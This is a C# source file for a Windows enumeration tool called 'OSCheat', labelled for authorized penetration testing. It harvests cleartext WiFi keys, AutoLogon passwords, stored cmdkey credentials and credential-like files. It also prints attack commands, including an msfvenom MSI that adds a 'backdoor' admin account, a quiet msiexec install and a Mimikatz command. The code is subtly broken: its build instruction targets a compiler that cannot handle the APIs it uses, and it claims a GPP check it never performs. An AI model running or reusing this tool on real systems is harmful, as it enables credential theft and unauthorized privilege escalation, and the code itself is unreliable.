// =============================================================================
// OSCheat - Pure C# enumerator (no PowerShell, no Python, no install)
// Compile with: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe oscheat.cs
// Or use the build_cs.bat file for easy compilation
// =============================================================================

using System;
using System.IO;
using System.Diagnostics;
using System.Security.Principal;
using System.DirectoryServices;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.NetworkInformation;
using System.Net;
using System.Threading;
using System.Web.Script.Serialization;

namespace OSCheat
{
    class Program
    {
        // ANSI color codes - works on Win10+
        static readonly bool UseColors = true;
        
        // Color helpers
        static void R(string s) => WriteColored(s, ConsoleColor.Red);
        static void G(string s) => WriteColored(s, ConsoleColor.Green);
        static void Y(string s) => WriteColored(s, ConsoleColor.Yellow);
        static void B(string s) => WriteColored(s, ConsoleColor.Cyan);
        static void W(string s) => WriteColored(s, ConsoleColor.White);
        static void M(string s) => WriteColored(s, ConsoleColor.Magenta);
        static void X(string s) => WriteColored(s, ConsoleColor.Gray);
        static void N() => WriteColored("", ConsoleColor.Gray);

        static void WriteColored(string s, ConsoleColor c)
        {
            if (UseColors)
            {
                Console.ForegroundColor = c;
                Console.WriteLine(s);
                Console.ResetColor();
            }
            else
            {
                Console.WriteLine(s);
            }
        }

        static string Banner(int pad) => new string('=', pad);
        
        static void ShowBanner(string title, ConsoleColor color = ConsoleColor.Cyan)
        {
            Console.WriteLine();
            for (int i = 0; i < 3; i++)
            {
                Console.WriteLine(Banner(78));
            }
            if (UseColors) Console.ForegroundColor = color;
            Console.WriteLine("  " + title);
            if (UseColors) Console.ResetColor();
            for (int i = 0; i < 3; i++)
            {
                Console.WriteLine(Banner(78));
            }
            Console.WriteLine();
        }

        static void SectionHeader(string title)
        {
            Console.WriteLine();
            if (UseColors) Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine(Banner(78));
            Console.WriteLine("  " + title);
            Console.WriteLine(Banner(78));
            if (UseColors) Console.ResetColor();
        }

        // ====== RUN PROCESS WITH CAPTURE ======
        static string RunProc(string fileName, string args, int timeoutMs = 15000)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = fileName,
                    Arguments = args,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };
                
                using (var proc = Process.Start(psi))
                {
                    if (!proc.WaitForExit(timeoutMs))
                    {
                        try { proc.Kill(); } catch { }
                        return "[TIMEOUT]";
                    }
                    return proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
                }
            }
            catch (Exception ex)
            {
                return "[ERROR: " + ex.Message + "]";
            }
        }

        static bool IsAdmin()
        {
            try
            {
                using (WindowsIdentity id = WindowsIdentity.GetCurrent())
                {
                    WindowsPrincipal pr = new WindowsPrincipal(id);
                    return pr.IsInRole(WindowsBuiltInRole.Administrator);
                }
            }
            catch { return false; }
        }

        // ====== SECTION 1: SYSTEM INFO ======
        static void SystemInfo(string outDir)
        {
            SectionHeader("01. SYSTEM INFO");
            
            string hostname = Environment.MachineName;
            string user = Environment.UserName;
            string domain = Environment.UserDomainName;
            string os = Environment.OSVersion.ToString();
            string arch = Environment.Is64BitOperatingSystem ? "x64" : "x86";
            bool admin = IsAdmin();
            
            W("  Hostname:      " + hostname);
            W("  Domain:        " + domain);
            W("  Username:      " + domain + "\\" + user);
            W("  OS:            " + os);
            W("  Architecture:  " + arch);
            W("  Admin:         " + admin);
            W("  .NET:          " + Environment.Version);
            W("  CPUs:          " + Environment.ProcessorCount);
            
            // systeminfo
            X("  --- systeminfo (truncated) ---");
            string si = RunProc("systeminfo", "");
            if (!string.IsNullOrEmpty(si))
            {
                foreach (var line in si.Split('\n').Take(20))
                {
                    X("    " + line.Trim());
                }
                File.WriteAllText(Path.Combine(outDir, "systeminfo.txt"), si);
            }
        }

        // ====== SECTION 2: USERS & GROUPS ======
        static void UsersAndGroups(string outDir)
        {
            SectionHeader("02. USERS & GROUPS");
            
            // whoami
            X("  --- whoami /all ---");
            string whoami = RunProc("whoami", "/all");
            if (!string.IsNullOrEmpty(whoami))
            {
                foreach (var line in whoami.Split('\n').Take(40))
                {
                    string l = line.Trim();
                    if (string.IsNullOrEmpty(l)) continue;
                    
                    bool isDangerous = false;
                    string dangerNote = "";
                    
                    if (l.Contains("SeImpersonatePrivilege") && l.Contains("Enabled"))
                    {
                        isDangerous = true;
                        dangerNote = " → SeImpersonatePrivilege enabled! Potato attacks (Rogue/Juicy/PrintSpoofer).";
                    }
                    else if (l.Contains("SeBackupPrivilege") && l.Contains("Enabled"))
                    {
                        isDangerous = true;
                        dangerNote = " → SeBackupPrivilege enabled! Can read SAM/SYSTEM.";
                    }
                    else if (l.Contains("SeRestorePrivilege") && l.Contains("Enabled"))
                    {
                        isDangerous = true;
                        dangerNote = " → SeRestorePrivilege enabled! Write to protected paths.";
                    }
                    else if (l.Contains("SeDebugPrivilege") && l.Contains("Enabled"))
                    {
                        isDangerous = true;
                        dangerNote = " → SeDebugPrivilege enabled! Process injection possible.";
                    }
                    else if (l.Contains("SeTakeOwnershipPrivilege") && l.Contains("Enabled"))
                    {
                        isDangerous = true;
                        dangerNote = " → SeTakeOwnershipPrivilege enabled!";
                    }
                    else if (l.Contains("SeLoadDriverPrivilege") && l.Contains("Enabled"))
                    {
                        isDangerous = true;
                        dangerNote = " → SeLoadDriverPrivilege enabled! Load kernel drivers.";
                    }
                    
                    if (isDangerous)
                    {
                        R("    [!] " + l + dangerNote);
                    }
                    else if (l.Contains("Privilege") || l.Contains("Group"))
                    {
                        X("    " + l);
                    }
                    else
                    {
                        X("    " + l);
                    }
                }
                File.WriteAllText(Path.Combine(outDir, "whoami.txt"), whoami);
            }
            
            // net user
            X("");
            X("  --- net user ---");
            string nu = RunProc("net", "user");
            if (!string.IsNullOrEmpty(nu))
            {
                foreach (var line in nu.Split('\n'))
                {
                    string l = line.Trim();
                    if (!string.IsNullOrEmpty(l) && !l.StartsWith("The command"))
                    {
                        X("    " + l);
                    }
                }
                File.WriteAllText(Path.Combine(outDir, "net_user.txt"), nu);
            }
            
            // localgroup Administrators
            X("");
            X("  --- Administrators group ---");
            string la = RunProc("net", "localgroup Administrators");
            if (!string.IsNullOrEmpty(la))
            {
                foreach (var line in la.Split('\n'))
                {
                    string l = line.Trim();
                    if (!string.IsNullOrEmpty(l) && !l.StartsWith("The command"))
                    {
                        X("    " + l);
                    }
                }
            }
        }

        // ====== SECTION 3: NETWORK ======
        static void NetworkInfo(string outDir)
        {
            SectionHeader("03. NETWORK INFO");
            
            // ipconfig
            X("  --- ipconfig /all ---");
            string ipc = RunProc("ipconfig", "/all");
            if (!string.IsNullOrEmpty(ipc))
            {
                foreach (var line in ipc.Split('\n').Take(40))
                {
                    X("    " + line.TrimEnd());
                }
                File.WriteAllText(Path.Combine(outDir, "ipconfig.txt"), ipc);
            }
            
            // netstat -ano LISTENING
            X("");
            X("  --- Listening ports ---");
            string ns = RunProc("netstat", "-ano");
            if (!string.IsNullOrEmpty(ns))
            {
                var lines = ns.Split('\n').Where(l => l.Contains("LISTENING")).Take(30);
                foreach (var line in lines)
                {
                    X("    " + line.Trim());
                }
                File.WriteAllText(Path.Combine(outDir, "netstat.txt"), ns);
            }
            
            // arp
            X("");
            X("  --- ARP cache ---");
            string arp = RunProc("arp", "-a");
            if (!string.IsNullOrEmpty(arp))
            {
                File.WriteAllText(Path.Combine(outDir, "arp.txt"), arp);
            }
            
            // route
            string rp = RunProc("route", "print");
            if (!string.IsNullOrEmpty(rp))
            {
                File.WriteAllText(Path.Combine(outDir, "route.txt"), rp);
            }
        }

        // ====== SECTION 4: PROCESSES & SERVICES ======
        static void ProcessesAndServices(string outDir)
        {
            SectionHeader("04. PROCESSES & SERVICES");
            
            // tasklist
            X("  --- Running processes ---");
            string tl = RunProc("tasklist", "/v");
            if (!string.IsNullOrEmpty(tl))
            {
                var lines = tl.Split('\n').Skip(3).Take(30);
                foreach (var line in lines)
                {
                    X("    " + line.Trim());
                }
                File.WriteAllText(Path.Combine(outDir, "tasklist.txt"), tl);
            }
            
            // sc query
            X("");
            X("  --- Services (sc query, count only) ---");
            string sq = RunProc("sc", "query");
            if (!string.IsNullOrEmpty(sq))
            {
                int count = sq.Split('\n').Count(l => l.Contains("SERVICE_NAME"));
                W("    Total services: " + count);
                File.WriteAllText(Path.Combine(outDir, "services.txt"), sq);
            }
            
            // Unquoted service paths via sc qc
            X("");
            X("  --- Unquoted Service Paths (potential hijack) ---");
            int unquoted = 0;
            try
            {
                Process p = new Process();
                p.StartInfo.FileName = "sc";
                p.StartInfo.Arguments = "query type= service state= all";
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                string output = p.StandardOutput.ReadToEnd();
                p.WaitForExit(15000);
                
                string[] serviceNames = output.Split(new[] { "SERVICE_NAME:" }, StringSplitOptions.None);
                foreach (var sn in serviceNames.Skip(1).Take(50))
                {
                    string name = sn.Trim().Split('\n')[0].Trim();
                    if (string.IsNullOrEmpty(name)) continue;
                    
                    Process p2 = new Process();
                    p2.StartInfo.FileName = "sc";
                    p2.StartInfo.Arguments = "qc \"" + name + "\"";
                    p2.StartInfo.UseShellExecute = false;
                    p2.StartInfo.RedirectStandardOutput = true;
                    p2.StartInfo.CreateNoWindow = true;
                    p2.Start();
                    string qc = p2.StandardOutput.ReadToEnd();
                    p2.WaitForExit(5000);
                    
                    if (qc.Contains("BINARY_PATH_NAME"))
                    {
                        int idx = qc.IndexOf("BINARY_PATH_NAME:");
                        string after = qc.Substring(idx);
                        int endIdx = after.IndexOf('\n');
                        if (endIdx > 0)
                        {
                            string path = after.Substring("BINARY_PATH_NAME:".Length, endIdx - "BINARY_PATH_NAME:".Length).Trim();
                            if (path.Length > 0 && !path.StartsWith("\"") && path.Contains(" ") && path.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
                            {
                                unquoted++;
                                if (unquoted <= 10)
                                {
                                    R("    [!] Service \"" + name + "\" unquoted: " + path);
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                X("    [SC scan failed: " + ex.Message + "]");
            }
            
            if (unquoted == 0)
            {
                G("    [+] No obvious unquoted service paths detected");
            }
            else
            {
                Y("    [?] Total unquoted services found: " + unquoted);
            }
        }

        // ====== SECTION 5: INSTALLED SOFTWARE ======
        static void InstalledSoftware(string outDir)
        {
            SectionHeader("05. INSTALLED SOFTWARE");
            
            X("  --- Installed applications (from registry) ---");
            
            string[] regPaths = {
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            };
            
            string[] interesting = {
                "putty", "winscp", "filezilla", "vmware", "virtualbox", "tightvnc",
                "kaspersky", "symantec", "mcafee", "avg", "avast", "norton", "webroot",
                "office", "outlook", "sql", "mysql", "postgres", "mongodb",
                "chrome", "firefox", "7-zip", "notepad++", "sublime", "atom",
                "python", "java", "jdk", "node", "git", "docker", "wireshark"
            };
            
            StringBuilder sb = new StringBuilder();
            
            try
            {
                foreach (string rp in regPaths)
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(rp))
                    {
                        if (key == null) continue;
                        foreach (string subkeyName in key.GetSubKeyNames())
                        {
                            using (RegistryKey subkey = key.OpenSubKey(subkeyName))
                            {
                                if (subkey == null) continue;
                                object nameObj = subkey.GetValue("DisplayName");
                                if (nameObj == null) continue;
                                string name = nameObj.ToString();
                                string ver = subkey.GetValue("DisplayVersion")?.ToString() ?? "";
                                string pub = subkey.GetValue("Publisher")?.ToString() ?? "";
                                
                                if (string.IsNullOrEmpty(name)) continue;
                                
                                bool highlight = interesting.Any(i => name.ToLower().Contains(i));
                                string line = "    " + name.PadRight(45) + " v" + ver;
                                sb.AppendLine(line.Trim());
                                
                                if (highlight)
                                {
                                    Y(line);
                                }
                                else
                                {
                                    X(line);
                                }
                            }
                        }
                    }
                }
                File.WriteAllText(Path.Combine(outDir, "software.txt"), sb.ToString());
            }
            catch (Exception ex)
            {
                X("    [Registry read failed: " + ex.Message + "]");
            }
        }

        // ====== SECTION 6: SCHEDULED TASKS ======
        static void ScheduledTasks(string outDir)
        {
            SectionHeader("06. SCHEDULED TASKS");
            
            string st = RunProc("schtasks", "/query /fo LIST /v", 30000);
            if (!string.IsNullOrEmpty(st))
            {
                // Look for non-system tasks
                int nonSystemCount = 0;
                var lines = st.Split('\n');
                for (int i = 0; i < lines.Length; i++)
                {
                    string l = lines[i].Trim();
                    if (l.StartsWith("Run As User:"))
                    {
                        string user = l.Substring("Run As User:".Length).Trim();
                        if (!string.IsNullOrEmpty(user) && 
                            user != "SYSTEM" && 
                            user != "Local Service" && 
                            user != "Network Service" &&
                            !user.Contains("NT AUTHORITY") &&
                            !user.StartsWith("NT "))
                        {
                            nonSystemCount++;
                            if (nonSystemCount <= 5)
                            {
                                R("    [!] Non-system task: " + user);
                            }
                        }
                    }
                }
                if (nonSystemCount == 0)
                {
                    G("    [+] All tasks run as system/service accounts");
                }
                else
                {
                    Y("    [?] Total non-system tasks: " + nonSystemCount);
                }
                File.WriteAllText(Path.Combine(outDir, "schtasks.txt"), st);
            }
        }

        // ====== SECTION 7: AUTOSTART ======
        static void AutostartLocations()
        {
            SectionHeader("07. AUTOSTART LOCATIONS");
            
            string[] keys = {
                @"Software\Microsoft\Windows\CurrentVersion\Run",
                @"Software\Microsoft\Windows\CurrentVersion\RunOnce"
            };
            
            // HKCU
            X("  --- HKCU Run / RunOnce ---");
            try
            {
                foreach (string k in keys)
                {
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(k))
                    {
                        if (key == null)
                        {
                            X("    (not set)");
                            continue;
                        }
                        foreach (var vName in key.GetValueNames())
                        {
                            object v = key.GetValue(vName);
                            if (v != null)
                            {
                                X("    " + vName + " = " + v.ToString().Substring(0, Math.Min(100, v.ToString().Length)));
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                X("    [Error: " + ex.Message + "]");
            }
            
            // HKLM
            X("");
            X("  --- HKLM Run ---");
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run"))
                {
                    if (key == null)
                    {
                        X("    (not set)");
                    }
                    else
                    {
                        foreach (var vName in key.GetValueNames())
                        {
                            object v = key.GetValue(vName);
                            if (v != null)
                            {
                                X("    " + vName + " = " + v.ToString());
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                X("    [Error: " + ex.Message + "]");
            }
        }

        // ====== SECTION 8: CREDENTIALS ======
        static void Credentials(string outDir)
        {
            SectionHeader("08. CREDENTIALS & SECRETS");
            
            // cmdkey
            X("  --- cmdkey /list ---");
            string ck = RunProc("cmdkey", "/list");
            if (!string.IsNullOrEmpty(ck))
            {
                foreach (var line in ck.Split('\n'))
                {
                    string l = line.Trim();
                    if (l.StartsWith("Target:") || l.StartsWith("Type:") || l.StartsWith("User:"))
                    {
                        X("    " + l);
                    }
                }
                File.WriteAllText(Path.Combine(outDir, "cmdkey.txt"), ck);
            }
            
            // AutoLogon password in registry
            X("");
            X("  --- AutoLogon in Registry ---");
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"))
                {
                    if (key != null)
                    {
                        string user = key.GetValue("DefaultUserName")?.ToString();
                        string pwd = key.GetValue("DefaultPassword")?.ToString();
                        string auto = key.GetValue("AutoAdminLogon")?.ToString();
                        
                        if (!string.IsNullOrEmpty(user))
                        {
                            R("    [!] DefaultUserName: " + user);
                        }
                        if (!string.IsNullOrEmpty(pwd))
                        {
                            R("    [!] DefaultPassword (cleartext!): " + pwd);
                        }
                        if (auto == "1")
                        {
                            Y("    [?] AutoAdminLogon is enabled");
                        }
                        if (string.IsNullOrEmpty(user) && string.IsNullOrEmpty(pwd))
                        {
                            G("    [+] No AutoLogon credentials in registry");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                X("    [Error: " + ex.Message + "]");
            }
            
            // WiFi passwords
            X("");
            X("  --- WiFi Profiles ---");
            string wlan = RunProc("netsh", "wlan show profiles");
            if (!string.IsNullOrEmpty(wlan) && !wlan.Contains("not exist") && !wlan.Contains("doesn't exist"))
            {
                var lines = wlan.Split('\n');
                foreach (var line in lines)
                {
                    if (line.Contains(":"))
                    {
                        string[] parts = line.Split(new[] { ':' }, 2);
                        if (parts.Length == 2 && !string.IsNullOrWhiteSpace(parts[1]))
                        {
                            string profile = parts[1].Trim();
                            string detail = RunProc("netsh", "wlan show profile name=\"" + profile + "\" key=clear");
                            if (!string.IsNullOrEmpty(detail))
                            {
                                int ki = detail.IndexOf("Key Content");
                                if (ki >= 0)
                                {
                                    int colonIdx = detail.IndexOf(':', ki);
                                    if (colonIdx >= 0)
                                    {
                                        int newlineIdx = detail.IndexOf('\n', colonIdx);
                                        string pass = newlineIdx > colonIdx 
                                            ? detail.Substring(colonIdx + 1, newlineIdx - colonIdx - 1).Trim()
                                            : detail.Substring(colonIdx + 1).Trim();
                                        if (!string.IsNullOrEmpty(pass) && pass != "Not available")
                                        {
                                            R("    [!] WiFi \"" + profile + "\" password: " + pass);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            else
            {
                X("    (no WiFi adapters or no profiles)");
            }
        }

        // ====== SECTION 9: SECURITY POLICY ======
        static void SecurityPolicy(string outDir)
        {
            SectionHeader("09. SECURITY POLICY & UAC");
            
            // AlwaysInstallElevated
            X("  --- AlwaysInstallElevated (the holy grail check) ---");
            bool hklmOk = false, hkcuOk = false;
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows\Installer"))
                {
                    if (key != null)
                    {
                        object v = key.GetValue("AlwaysInstallElevated");
                        hklmOk = (v != null && v.ToString() == "1");
                    }
                }
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows\Installer"))
                {
                    if (key != null)
                    {
                        object v = key.GetValue("AlwaysInstallElevated");
                        hkcuOk = (v != null && v.ToString() == "1");
                    }
                }
            }
            catch (Exception ex)
            {
                X("    [Error: " + ex.Message + "]");
            }
            
            X("    HKLM: " + hklmOk);
            X("    HKCU: " + hkcuOk);
            
            if (hklmOk && hkcuOk)
            {
                R("    [!] AlwaysInstallElevated = 1 on BOTH hives!");
                R("    [!] Generate MSI: msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi");
                R("    [!] Run: msiexec /quiet /qn /i evil.msi");
            }
            else
            {
                G("    [+] Not set on both keys (good)");
            }
            
            // WDigest
            X("");
            X("  --- WDigest ---");
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest"))
                {
                    if (key != null)
                    {
                        object v = key.GetValue("UseLogonCredential");
                        string val = v?.ToString() ?? "0";
                        if (val == "1")
                        {
                            R("    [!] WDigest UseLogonCredential = 1 -> cleartext creds cached!");
                            R("    [!] Mimikatz: sekurlsa::wdigest");
                        }
                        else
                        {
                            X("    WDigest UseLogonCredential = " + val + " (good, no cleartext cache)");
                        }
                    }
                    else
                    {
                        X("    (WDigest setting not found)");
                    }
                }
            }
            catch (Exception ex)
            {
                X("    [Error: " + ex.Message + "]");
            }
            
            // UAC level
            X("");
            X("  --- UAC Level ---");
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    if (key != null)
                    {
                        string consent = key.GetValue("ConsentPromptBehaviorAdmin")?.ToString() ?? "?";
                        string lua = key.GetValue("EnableLUA")?.ToString() ?? "?";
                        X("    ConsentPromptBehaviorAdmin: " + consent);
                        X("    EnableLUA: " + lua);
                        
                        if (consent == "0")
                        {
                            R("    [!] UAC effectively DISABLED - all bypass methods work");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                X("    [Error: " + ex.Message + "]");
            }
        }

        // ====== SECTION 10: FS ======
        static void Filesystem(string outDir)
        {
            SectionHeader("10. FILESYSTEM");
            
            X("  --- Searching user dirs for credential-like files ---");
            
            string[] patterns = { "password*", "*.kdbx", "*.pem", "unattend.xml",
                                  "*.bak", "*.config", "*.ini", "*.sql", "*.db",
                                  "*.kdb", "*.key" };
            
            string userProfile = Environment.GetEnvironmentVariable("USERPROFILE");
            if (!string.IsNullOrEmpty(userProfile) && Directory.Exists(userProfile))
            {
                int totalFound = 0;
                foreach (string pattern in patterns)
                {
                    try
                    {
                        var files = Directory.EnumerateFiles(userProfile, pattern,
                            new EnumerationOptions { IgnoreInaccessible = true, RecurseSubdirectories = true, MaxRecursionDepth = 4 })
                            .Take(5);
                        
                        foreach (var f in files)
                        {
                            FileInfo fi = new FileInfo(f);
                            if (fi.Length < 1_000_000)
                            {
                                X("    Found: " + f);
                                totalFound++;
                            }
                        }
                    }
                    catch { }
                    
                    if (totalFound >= 30) break;
                }
                if (totalFound == 0)
                {
                    G("    [+] No obvious credential files in user dirs");
                }
            }
            else
            {
                X("    (cannot read USERPROFILE)");
            }
            
            // Look in Documents/Desktop/Downloads specifically
            string[] specialFolders = {
                Environment.SpecialFolder.Desktop.ToString(),
                "Documents", "Downloads"
            };
            
            X("");
            X("  --- Recent files in Documents/Desktop/Downloads ---");
            int recentFiles = 0;
            foreach (string folder in specialFolders)
            {
                string path = Path.Combine(userProfile ?? "", folder);
                if (Directory.Exists(path))
                {
                    try
                    {
                        var files = Directory.EnumerateFiles(path, "*", SearchOption.TopDirectoryOnly)
                            .Where(f => new FileInfo(f).Length < 5_000_000);
                        foreach (var f in files.Take(5))
                        {
                            X("    " + f);
                            recentFiles++;
                        }
                    }
                    catch { }
                }
            }
        }

        // ====== MAIN ======
        static void Main(string[] args)
        {
            // Output directory
            string outDir = Path.Combine(Path.GetTempPath(), "oscheat_" + DateTime.Now.ToString("yyyyMMdd_HHmmss"));
            try { Directory.CreateDirectory(outDir); } catch { }
            
            // Banner
            Console.WriteLine();
            if (UseColors) Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("================================================================");
            Console.WriteLine("  OSCheat v1.0 - C# Edition                                    ");
            Console.WriteLine("  Windows enumeration for authorized penetration testing      ");
            Console.WriteLine("================================================================");
            if (UseColors) Console.ResetColor();
            Console.WriteLine();
            X("  Started:  " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
            X("  Output:   " + outDir);
            X("  Admin:    " + IsAdmin());
            Console.WriteLine();
            
            // Run all sections
            SystemInfo(outDir);
            UsersAndGroups(outDir);
            NetworkInfo(outDir);
            ProcessesAndServices(outDir);
            InstalledSoftware(outDir);
            ScheduledTasks(outDir);
            AutostartLocations();
            Credentials(outDir);
            SecurityPolicy(outDir);
            Filesystem(outDir);
            
            // Summary
            ShowBanner("SUMMARY - Review findings above (lines marked with [!] or [?])", ConsoleColor.Green);
            Console.WriteLine();
            G("  Top escalation vectors to investigate:");
            Console.WriteLine();
            W("    1. AlwaysInstallElevated -> free MSI elevation");
            W("    2. SeImpersonate / SeBackup / SeRestore / SeDebug -> Potato attacks");
            W("    3. Unquoted service paths -> service hijack");
            W("    4. cmdkey stored credentials -> direct reuse");
            W("    5. WDigest caching -> Mimikatz from workstation");
            W("    6. cpassword in GPP -> free Win admin");
            W("    7. WiFi / AutoLogon creds -> lateral movement");
            Console.WriteLine();
            
            ShowBanner("REPORTS SAVED", ConsoleColor.Green);
            Console.WriteLine();
            W("  Output: " + outDir);
            if (Directory.Exists(outDir))
            {
                foreach (var f in Directory.EnumerateFiles(outDir))
                {
                    FileInfo fi = new FileInfo(f);
                    W("    " + fi.Name.PadRight(30) + (fi.Length / 1024.0).ToString("N1") + " KB");
                }
            }
            Console.WriteLine();
            G("  Finished at " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
            Console.WriteLine();
            G("  Press any key to exit...");
            try { Console.ReadKey(); } catch { }
        }
    }
}
